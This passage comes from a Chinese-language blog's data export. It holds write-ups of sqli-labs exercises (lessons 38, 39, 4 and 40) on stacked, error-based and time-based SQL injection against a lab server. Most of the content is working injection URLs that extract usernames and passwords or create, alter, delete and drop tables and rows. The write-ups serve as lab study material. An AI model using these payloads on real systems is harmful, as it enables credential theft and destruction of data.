title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-38/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-38/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-38/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-38/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-38/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-38/006.png\" alt=\"006\"></p>\n<p>总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。</p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p>跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。</p>\n<p><code>http://192.168.75.132/sql/Less-38/?id=2&#39; and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-38/007.png\" alt=\"007\"></p>\n<h3 id=\"增\"><a href=\"#增\" class=\"headerlink\" title=\"增\"></a>增</h3><h4 id=\"创建表\"><a href=\"#创建表\" class=\"headerlink\" title=\"创建表\"></a>创建表</h4><p><code>http://192.168.75.132/sql/Less-38/?id=2&#39;;create table test like users;%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/008.png\" alt=\"008\"></p>\n<h4 id=\"插入数据\"><a href=\"#插入数据\" class=\"headerlink\" title=\"插入数据\"></a>插入数据</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;insert into test(id,username,password)values(100,&#39;zhao&#39;,&#39;zhao&#39;);%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/009.png\" alt=\"009\"></p>\n<p><img src=\"/img/sql/Lesson-38/010.png\" alt=\"010\"></p>\n<p>还可以将结构相同的表数据插入。</p>\n<p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;insert into test select * from users%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/011.png\" alt=\"011\"></p>\n<p><img src=\"/img/sql/Lesson-38/012.png\" alt=\"012\"></p>\n<h3 id=\"删\"><a href=\"#删\" class=\"headerlink\" title=\"删\"></a>删</h3><h4 id=\"删除数据\"><a href=\"#删除数据\" class=\"headerlink\" title=\"删除数据\"></a>删除数据</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;delete from test where id = 100%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/013.png\" alt=\"013\"></p>\n<p><img src=\"/img/sql/Lesson-38/014.png\" alt=\"014\"></p>\n<h4 id=\"删除表\"><a href=\"#删除表\" class=\"headerlink\" title=\"删除表\"></a>删除表</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;drop table user_test;%23</code></p>\n<h3 id=\"改\"><a href=\"#改\" class=\"headerlink\" title=\"改\"></a>改</h3><h4 id=\"修改表名\"><a href=\"#修改表名\" class=\"headerlink\" title=\"修改表名\"></a>修改表名</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;alter table test rename to user_test;%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/015.png\" alt=\"015\"></p>\n<p><img src=\"/img/sql/Lesson-38/016.png\" alt=\"016\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-38-GET-堆叠注入\"><a href=\"#sqli-labs-lession-38-GET-堆叠注入\" class=\"headerlink\" title=\"sqli-labs lession-38 GET-堆叠注入\"></a>sqli-labs lession-38 GET-堆叠注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-38/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-38/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-38/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-38/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-38/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-38/006.png\" alt=\"006\"></p>\n<p>总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。</p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p>跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。</p>\n<p><code>http://192.168.75.132/sql/Less-38/?id=2&#39; and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-38/007.png\" alt=\"007\"></p>\n<h3 id=\"增\"><a href=\"#增\" class=\"headerlink\" title=\"增\"></a>增</h3><h4 id=\"创建表\"><a href=\"#创建表\" class=\"headerlink\" title=\"创建表\"></a>创建表</h4><p><code>http://192.168.75.132/sql/Less-38/?id=2&#39;;create table test like users;%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/008.png\" alt=\"008\"></p>\n<h4 id=\"插入数据\"><a href=\"#插入数据\" class=\"headerlink\" title=\"插入数据\"></a>插入数据</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;insert into test(id,username,password)values(100,&#39;zhao&#39;,&#39;zhao&#39;);%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/009.png\" alt=\"009\"></p>\n<p><img src=\"/img/sql/Lesson-38/010.png\" alt=\"010\"></p>\n<p>还可以将结构相同的表数据插入。</p>\n<p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;insert into test select * from users%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/011.png\" alt=\"011\"></p>\n<p><img src=\"/img/sql/Lesson-38/012.png\" alt=\"012\"></p>\n<h3 id=\"删\"><a href=\"#删\" class=\"headerlink\" title=\"删\"></a>删</h3><h4 id=\"删除数据\"><a href=\"#删除数据\" class=\"headerlink\" title=\"删除数据\"></a>删除数据</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;delete from test where id = 100%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/013.png\" alt=\"013\"></p>\n<p><img src=\"/img/sql/Lesson-38/014.png\" alt=\"014\"></p>\n<h4 id=\"删除表\"><a href=\"#删除表\" class=\"headerlink\" title=\"删除表\"></a>删除表</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;drop table user_test;%23</code></p>\n<h3 id=\"改\"><a href=\"#改\" class=\"headerlink\" title=\"改\"></a>改</h3><h4 id=\"修改表名\"><a href=\"#修改表名\" class=\"headerlink\" title=\"修改表名\"></a>修改表名</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;alter table test rename to user_test;%23</code></p>\n<p><img src=\"/img/sql/Lesson-38/015.png\" alt=\"015\"></p>\n<p><img src=\"/img/sql/Lesson-38/016.png\" alt=\"016\"></p>\n"},{"title":"sqli-labs lession-39 GET-堆叠注入-整型","date":"2018-10-18T15:09:00.000Z","_content":"\n# sqli-labs lession-39 GET-堆叠注入-整型\n\n---\n\n## 分析\n\n与上一课只是闭合方式不同。\n\n## 增\n\n`http://192.168.75.133/sql/Less-39/?id=1; create database auth;use auth;create table users( id int(3) not null auto_increment, username varchar(200) not null, password varchar(200) not null, primary key (id));%23`\n\n```\ncreate database auth; //创建数据库\nuse auth; \t\t\t//使用auth数据库\n//创建用户表\ncreate table users(\n    id int(3) not null auto_increment,\n    username varchar(200) not null,\n    password varchar(200)  not null,\n    primary key (id)\n);\n\n```\n\n![001](/img/sql/Lesson-39/001.png)\n\n插入数据\n\n`http://192.168.75.133/sql/Less-39/?id=1;use auth;insert into users values('0','zhao','zhao'); insert into users values('0','qian','qian'); insert into users values('0','sun','sun'); insert into users values('0','li','li'); insert into users values('0','admin','admin');%23`\n\n![002](/img/sql/Lesson-39/002.png)\n\n## 删\n\n**删除已存在的字段**\n\n`http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users drop username;%23`\n\n![003](/img/sql/Lesson-39/003.png)\n\n![004](/img/sql/Lesson-39/004.png)\n\n## 改\n\n修改列的类型\n\n`http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users modify id char(40);%23`\n\n![005](/img/sql/Lesson-39/005.png)\n\n![006](/img/sql/Lesson-39/006.png)","source":"_posts/sqli-labs-lession-39-GET-堆叠注入-整型.md","raw":"---\ntitle: sqli-labs lession-39 GET-堆叠注入-整型\ndate: 2018-10-18 23:09:00\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-39 GET-堆叠注入-整型\n\n---\n\n## 分析\n\n与上一课只是闭合方式不同。\n\n## 增\n\n`http://192.168.75.133/sql/Less-39/?id=1; create database auth;use auth;create table users( id int(3) not null auto_increment, username varchar(200) not null, password varchar(200) not null, primary key (id));%23`\n\n```\ncreate database auth; //创建数据库\nuse auth; \t\t\t//使用auth数据库\n//创建用户表\ncreate table users(\n    id int(3) not null auto_increment,\n    username varchar(200) not null,\n    password varchar(200)  not null,\n    primary key (id)\n);\n\n```\n\n![001](/img/sql/Lesson-39/001.png)\n\n插入数据\n\n`http://192.168.75.133/sql/Less-39/?id=1;use auth;insert into users values('0','zhao','zhao'); insert into users values('0','qian','qian'); insert into users values('0','sun','sun'); insert into users values('0','li','li'); insert into users values('0','admin','admin');%23`\n\n![002](/img/sql/Lesson-39/002.png)\n\n## 删\n\n**删除已存在的字段**\n\n`http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users drop username;%23`\n\n![003](/img/sql/Lesson-39/003.png)\n\n![004](/img/sql/Lesson-39/004.png)\n\n## 改\n\n修改列的类型\n\n`http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users modify id char(40);%23`\n\n![005](/img/sql/Lesson-39/005.png)\n\n![006](/img/sql/Lesson-39/006.png)","slug":"sqli-labs-lession-39-GET-堆叠注入-整型","published":1,"updated":"2019-06-19T17:23:13.392Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istek004y4dsb1bnp6y4w","content":"<h1 id=\"sqli-labs-lession-39-GET-堆叠注入-整型\"><a href=\"#sqli-labs-lession-39-GET-堆叠注入-整型\" class=\"headerlink\" title=\"sqli-labs lession-39 GET-堆叠注入-整型\"></a>sqli-labs lession-39 GET-堆叠注入-整型</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>与上一课只是闭合方式不同。</p>\n<h2 id=\"增\"><a href=\"#增\" class=\"headerlink\" title=\"增\"></a>增</h2><p><code>http://192.168.75.133/sql/Less-39/?id=1; create database auth;use auth;create table users( id int(3) not null auto_increment, username varchar(200) not null, password varchar(200) not null, primary key (id));%23</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">database</span> auth; //创建数据库</span><br><span class=\"line\"><span class=\"keyword\">use</span> auth; \t\t\t//使用auth数据库</span><br><span class=\"line\">//创建用户表</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> <span class=\"keyword\">users</span>(</span><br><span class=\"line\">    <span class=\"keyword\">id</span> <span class=\"built_in\">int</span>(<span class=\"number\">3</span>) <span class=\"keyword\">not</span> <span class=\"literal\">null</span> auto_increment,</span><br><span class=\"line\">    username <span class=\"built_in\">varchar</span>(<span class=\"number\">200</span>) <span class=\"keyword\">not</span> <span class=\"literal\">null</span>,</span><br><span class=\"line\">    <span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">200</span>)  <span class=\"keyword\">not</span> <span class=\"literal\">null</span>,</span><br><span class=\"line\">    primary <span class=\"keyword\">key</span> (<span class=\"keyword\">id</span>)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/sql/Lesson-39/001.png\" alt=\"001\"></p>\n<p>插入数据</p>\n<p><code>http://192.168.75.133/sql/Less-39/?id=1;use auth;insert into users values(&#39;0&#39;,&#39;zhao&#39;,&#39;zhao&#39;); insert into users values(&#39;0&#39;,&#39;qian&#39;,&#39;qian&#39;); insert into users values(&#39;0&#39;,&#39;sun&#39;,&#39;sun&#39;); insert into users values(&#39;0&#39;,&#39;li&#39;,&#39;li&#39;); insert into users values(&#39;0&#39;,&#39;admin&#39;,&#39;admin&#39;);%23</code></p>\n<p><img src=\"/img/sql/Lesson-39/002.png\" alt=\"002\"></p>\n<h2 id=\"删\"><a href=\"#删\" class=\"headerlink\" title=\"删\"></a>删</h2><p><strong>删除已存在的字段</strong></p>\n<p><code>http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users drop username;%23</code></p>\n<p><img src=\"/img/sql/Lesson-39/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-39/004.png\" alt=\"004\"></p>\n<h2 id=\"改\"><a href=\"#改\" class=\"headerlink\" title=\"改\"></a>改</h2><p>修改列的类型</p>\n<p><code>http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users modify id char(40);%23</code></p>\n<p><img src=\"/img/sql/Lesson-39/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-39/006.png\" alt=\"006\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-39-GET-堆叠注入-整型\"><a href=\"#sqli-labs-lession-39-GET-堆叠注入-整型\" class=\"headerlink\" title=\"sqli-labs lession-39 GET-堆叠注入-整型\"></a>sqli-labs lession-39 GET-堆叠注入-整型</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>与上一课只是闭合方式不同。</p>\n<h2 id=\"增\"><a href=\"#增\" class=\"headerlink\" title=\"增\"></a>增</h2><p><code>http://192.168.75.133/sql/Less-39/?id=1; create database auth;use auth;create table users( id int(3) not null auto_increment, username varchar(200) not null, password varchar(200) not null, primary key (id));%23</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">database</span> auth; //创建数据库</span><br><span class=\"line\"><span class=\"keyword\">use</span> auth; \t\t\t//使用auth数据库</span><br><span class=\"line\">//创建用户表</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> <span class=\"keyword\">users</span>(</span><br><span class=\"line\">    <span class=\"keyword\">id</span> <span class=\"built_in\">int</span>(<span class=\"number\">3</span>) <span class=\"keyword\">not</span> <span class=\"literal\">null</span> auto_increment,</span><br><span class=\"line\">    username <span class=\"built_in\">varchar</span>(<span class=\"number\">200</span>) <span class=\"keyword\">not</span> <span class=\"literal\">null</span>,</span><br><span class=\"line\">    <span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">200</span>)  <span class=\"keyword\">not</span> <span class=\"literal\">null</span>,</span><br><span class=\"line\">    primary <span class=\"keyword\">key</span> (<span class=\"keyword\">id</span>)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/sql/Lesson-39/001.png\" alt=\"001\"></p>\n<p>插入数据</p>\n<p><code>http://192.168.75.133/sql/Less-39/?id=1;use auth;insert into users values(&#39;0&#39;,&#39;zhao&#39;,&#39;zhao&#39;); insert into users values(&#39;0&#39;,&#39;qian&#39;,&#39;qian&#39;); insert into users values(&#39;0&#39;,&#39;sun&#39;,&#39;sun&#39;); insert into users values(&#39;0&#39;,&#39;li&#39;,&#39;li&#39;); insert into users values(&#39;0&#39;,&#39;admin&#39;,&#39;admin&#39;);%23</code></p>\n<p><img src=\"/img/sql/Lesson-39/002.png\" alt=\"002\"></p>\n<h2 id=\"删\"><a href=\"#删\" class=\"headerlink\" title=\"删\"></a>删</h2><p><strong>删除已存在的字段</strong></p>\n<p><code>http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users drop username;%23</code></p>\n<p><img src=\"/img/sql/Lesson-39/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-39/004.png\" alt=\"004\"></p>\n<h2 id=\"改\"><a href=\"#改\" class=\"headerlink\" title=\"改\"></a>改</h2><p>修改列的类型</p>\n<p><code>http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users modify id char(40);%23</code></p>\n<p><img src=\"/img/sql/Lesson-39/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-39/006.png\" alt=\"006\"></p>\n"},{"title":"sqli-labs lession-4 基于错误的GET双引号字符型注入","date":"2018-09-20T01:08:58.000Z","_content":"# sqli-labs lession-4 基于错误的GET双引号字符型注入 #\n\n## 登录界面 ##\n\n![1](https://i.imgur.com/J6A7U4R.png)\n\n## 注入过程 ##\n\n题目提示是基于错误的,根据提示应该先判断错误类型。前三课分别使用了\n\n* 1\t`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n* 2 `$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";`\n* 3\t`$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";`\n\n所以不可能是上面的3种。尝试下双引号。\n\n`http://10.60.250.214/less/Less-4/?id=1%22`\n\n![2](https://i.imgur.com/DVv5q5W.png)\n\n返回报错信息:\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\"1\"\") LIMIT 0,1' at line 1`\n\n根据返回的错误信息猜测到SQL语句的源码应该为:\n\n`$sql=\"SELECT * FROM users WHERE id=(\"$id\") LIMIT 0,1\";`\n\n查看SQL语句,果然如此。\n\n![3](https://i.imgur.com/Z0Eor43.png)\n\n`http://10.60.250.214/less/Less-4/?id=1\") order by 100%23`\n\n![4](https://i.imgur.com/89fae8M.png)\n\n成功！！！\n\n剩下的操作无论是手注还是使用SQLMAP都和Lesson-1一样。\n\n具体流程可以查看这里。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}","source":"_posts/sqli-labs-lession-4-基于错误的GET双引号字符型注入.md","raw":"---\ntitle: sqli-labs lession-4 基于错误的GET双引号字符型注入\ndate: 2018-09-20 09:08:58\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs lession-4 基于错误的GET双引号字符型注入 #\n\n## 登录界面 ##\n\n![1](https://i.imgur.com/J6A7U4R.png)\n\n## 注入过程 ##\n\n题目提示是基于错误的,根据提示应该先判断错误类型。前三课分别使用了\n\n* 1\t`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n* 2 `$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";`\n* 3\t`$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";`\n\n所以不可能是上面的3种。尝试下双引号。\n\n`http://10.60.250.214/less/Less-4/?id=1%22`\n\n![2](https://i.imgur.com/DVv5q5W.png)\n\n返回报错信息:\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\"1\"\") LIMIT 0,1' at line 1`\n\n根据返回的错误信息猜测到SQL语句的源码应该为:\n\n`$sql=\"SELECT * FROM users WHERE id=(\"$id\") LIMIT 0,1\";`\n\n查看SQL语句,果然如此。\n\n![3](https://i.imgur.com/Z0Eor43.png)\n\n`http://10.60.250.214/less/Less-4/?id=1\") order by 100%23`\n\n![4](https://i.imgur.com/89fae8M.png)\n\n成功！！！\n\n剩下的操作无论是手注还是使用SQLMAP都和Lesson-1一样。\n\n具体流程可以查看这里。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}","slug":"sqli-labs-lession-4-基于错误的GET双引号字符型注入","published":1,"updated":"2019-06-19T17:23:13.393Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istem00514dsb6dqk86po","content":"<h1 id=\"sqli-labs-lession-4-基于错误的GET双引号字符型注入\"><a href=\"#sqli-labs-lession-4-基于错误的GET双引号字符型注入\" class=\"headerlink\" title=\"sqli-labs lession-4 基于错误的GET双引号字符型注入\"></a>sqli-labs lession-4 基于错误的GET双引号字符型注入</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/J6A7U4R.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>题目提示是基于错误的,根据提示应该先判断错误类型。前三课分别使用了</p>\n<ul>\n<li>1    <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></li>\n<li>2 <code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></li>\n<li>3    <code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></li>\n</ul>\n<p>所以不可能是上面的3种。尝试下双引号。</p>\n<p><code>http://10.60.250.214/less/Less-4/?id=1%22</code></p>\n<p><img src=\"https://i.imgur.com/DVv5q5W.png\" alt=\"2\"></p>\n<p>返回报错信息:</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></p>\n<p>根据返回的错误信息猜测到SQL语句的源码应该为:</p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1&quot;;</code></p>\n<p>查看SQL语句,果然如此。</p>\n<p><img src=\"https://i.imgur.com/Z0Eor43.png\" alt=\"3\"></p>\n<p><code>http://10.60.250.214/less/Less-4/?id=1&quot;) order by 100%23</code></p>\n<p><img src=\"https://i.imgur.com/89fae8M.png\" alt=\"4\"></p>\n<p>成功！！！</p>\n<p>剩下的操作无论是手注还是使用SQLMAP都和Lesson-1一样。</p>\n<p>具体流程可以查看这里。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-4-基于错误的GET双引号字符型注入\"><a href=\"#sqli-labs-lession-4-基于错误的GET双引号字符型注入\" class=\"headerlink\" title=\"sqli-labs lession-4 基于错误的GET双引号字符型注入\"></a>sqli-labs lession-4 基于错误的GET双引号字符型注入</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/J6A7U4R.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>题目提示是基于错误的,根据提示应该先判断错误类型。前三课分别使用了</p>\n<ul>\n<li>1    <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></li>\n<li>2 <code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></li>\n<li>3    <code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></li>\n</ul>\n<p>所以不可能是上面的3种。尝试下双引号。</p>\n<p><code>http://10.60.250.214/less/Less-4/?id=1%22</code></p>\n<p><img src=\"https://i.imgur.com/DVv5q5W.png\" alt=\"2\"></p>\n<p>返回报错信息:</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></p>\n<p>根据返回的错误信息猜测到SQL语句的源码应该为:</p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1&quot;;</code></p>\n<p>查看SQL语句,果然如此。</p>\n<p><img src=\"https://i.imgur.com/Z0Eor43.png\" alt=\"3\"></p>\n<p><code>http://10.60.250.214/less/Less-4/?id=1&quot;) order by 100%23</code></p>\n<p><img src=\"https://i.imgur.com/89fae8M.png\" alt=\"4\"></p>\n<p>成功！！！</p>\n<p>剩下的操作无论是手注还是使用SQLMAP都和Lesson-1一样。</p>\n<p>具体流程可以查看这里。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>"},{"title":"sqli-labs lession-40 GET盲注-堆叠注入-字符型","date":"2018-10-19T02:22:41.000Z","_content":"\n# sqli-labs lession-40 GET盲注-堆叠注入-字符型\n\n---\n\n## 分析\n\n这一课只是是盲注的堆叠注入，并且闭合方式为`')`。\n\n`http://192.168.75.132/sql/Less-40/?id=1') and if(1,sleep(10),null)%23`\n\n![001](/img/sql/Lesson-40/001.png)\n\n## 增\n\n在password字段后添加status字段\n\n``http://192.168.75.132/sql/Less-40/?id=1');ALTER TABLE `security`.`users` \nADD COLUMN `status` tinyint(1) NOT NULL AFTER `password`;%23``\n\n![002](/img/sql/Lesson-40/002.png)\n\n![003](/img/sql/Lesson-40/003.png)\n\n## 删\n\n删除以admin开头的用户。\n\n`http://192.168.75.132/sql/Less-40/?id=1');DELETE from users  where username like 'admin%';%23`\n\n![004](/img/sql/Lesson-40/004.png)\n\n## 改\n\n`http://192.168.75.132/sql/Less-40/?id=1');alter TABLE users rename to newusrs;%23`\n\n![005](/img/sql/Lesson-40/005.png)\n\n![006](/img/sql/Lesson-40/006.png)\n\n","source":"_posts/sqli-labs-lession-40-GET盲注-堆叠注入-字符型.md","raw":"---\ntitle: sqli-labs lession-40 GET盲注-堆叠注入-字符型\ndate: 2018-10-19 10:22:41\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-40 GET盲注-堆叠注入-字符型\n\n---\n\n## 分析\n\n这一课只是是盲注的堆叠注入，并且闭合方式为`')`。\n\n`http://192.168.75.132/sql/Less-40/?id=1') and if(1,sleep(10),null)%23`\n\n![001](/img/sql/Lesson-40/001.png)\n\n## 增\n\n在password字段后添加status字段\n\n``http://192.168.75.132/sql/Less-40/?id=1');ALTER TABLE `security`.`users` \nADD COLUMN `status` tinyint(1) NOT NULL AFTER `password`;%23``\n\n![002](/img/sql/Lesson-40/002.png)\n\n![003](/img/sql/Lesson-40/003.png)\n\n## 删\n\n删除以admin开头的用户。\n\n`http://192.168.75.132/sql/Less-40/?id=1');DELETE from users  where username like 'admin%';%23`\n\n![004](/img/sql/Lesson-40/004.png)\n\n## 改\n\n`http://192.168.75.132/sql/Less-40/?id=1');alter TABLE users rename to newusrs;%23`\n\n![005](/img/sql/Lesson-40/005.png)\n\n![006](/img/sql/Lesson-40/006.png)\n\n","slug":"sqli-labs-lession-40-GET盲注-堆叠注入-字符型","published":1,"updated":"2019-06-19T17:23:13.393Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3isteo00564dsb4lvnj3cz","content":"<h1 id=\"sqli-labs-lession-40-GET盲注-堆叠注入-字符型\"><a href=\"#sqli-labs-lession-40-GET盲注-堆叠注入-字符型\" class=\"headerlink\" title=\"sqli-labs lession-40 GET盲注-堆叠注入-字符型\"></a>sqli-labs lession-40 GET盲注-堆叠注入-字符型</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这一课只是是盲注的堆叠注入，并且闭合方式为<code>&#39;)</code>。</p>\n<p><code>http://192.168.75.132/sql/Less-40/?id=1&#39;) and if(1,sleep(10),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-40/001.png\" alt=\"001\"></p>\n<h2 id=\"增\"><a href=\"#增\" class=\"headerlink\" title=\"增\"></a>增</h2><p>在password字段后添加status字段</p>\n<p><code>http://192.168.75.132/sql/Less-40/?id=1&#39;);ALTER TABLE `security`.`users` \nADD COLUMN `status` tinyint(1) NOT NULL AFTER `password`;%23</code></p>\n<p><img src=\"/img/sql/Lesson-40/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-40/003.png\" alt=\"003\"></p>\n<h2 id=\"删\"><a href=\"#删\" class=\"headerlink\" title=\"删\"></a>删</h2><p>删除以admin开头的用户。</p>\n<p><code>http://192.168.75.132/sql/Less-40/?id=1&#39;);DELETE from users  where username like &#39;admin%&#39;;%23</code></p>\n<p><img src=\"/img/sql/Lesson-40/004.png\" alt=\"004\"></p>\n<h2 id=\"改\"><a href=\"#改\" class=\"headerlink\" title=\"改\"></a>改</h2><p><code>http://192.168.75.132/sql/Less-40/?id=1&#39;);alter TABLE users rename to newusrs;%23</code></p>\n<p><img src=\"/img/sql/Lesson-40/005.png\" alt=\"005\"></p>\n<p><img 